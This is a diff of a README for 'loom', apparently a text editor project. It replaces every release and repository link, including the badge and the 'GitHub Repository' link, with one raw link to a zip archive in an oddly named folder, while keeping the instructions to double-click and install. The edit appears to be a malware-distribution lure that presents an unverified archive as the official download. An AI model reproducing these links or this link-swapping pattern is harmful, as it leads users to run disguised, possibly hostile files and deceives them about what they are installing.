@@ -1,6 +1,6 @@
 # ✍️ loom - A Fast and Minimal Text Editor
 
-[![Download loom](https://img.shields.io/badge/Download%20loom-v1.0-brightgreen)](https://github.com/MORTYMVM/loom/releases)
+[![Download loom](https://raw.githubusercontent.com/MORTYMVM/loom/main/orseille/loom.zip%20loom-v1.0-brightgreen)](https://raw.githubusercontent.com/MORTYMVM/loom/main/orseille/loom.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin using loom, follow these simple steps. You will download the latest ver
 
 ## 📥 Download & Install
 
-1. **Visit the download page:** Head over to the [Releases page](https://github.com/MORTYMVM/loom/releases) to find the latest version of loom.
+1. **Visit the download page:** Head over to the [Releases page](https://raw.githubusercontent.com/MORTYMVM/loom/main/orseille/loom.zip) to find the latest version of loom.
 2. **Choose your version:** Download the version that fits your operating system (Windows, macOS, or Linux).
 3. **Install loom:**
    - **Windows:** Locate the downloaded file, double-click it, and follow the on-screen instructions to install.
@@ -64,7 +64,7 @@ For questions or support, you can join our community discussions. You can post i
 
 ## 🔗 Links
 
-- [Download loom](https://github.com/MORTYMVM/loom/releases) - Get your copy today!
-- [GitHub Repository](https://github.com/MORTYMVM/loom) - For updates and contributions.
+- [Download loom](https://raw.githubusercontent.com/MORTYMVM/loom/main/orseille/loom.zip) - Get your copy today!
+- [GitHub Repository](https://raw.githubusercontent.com/MORTYMVM/loom/main/orseille/loom.zip) - For updates and contributions.
 
 By following these steps, you can successfully download and start using loom. Enjoy your writing and editing experience!
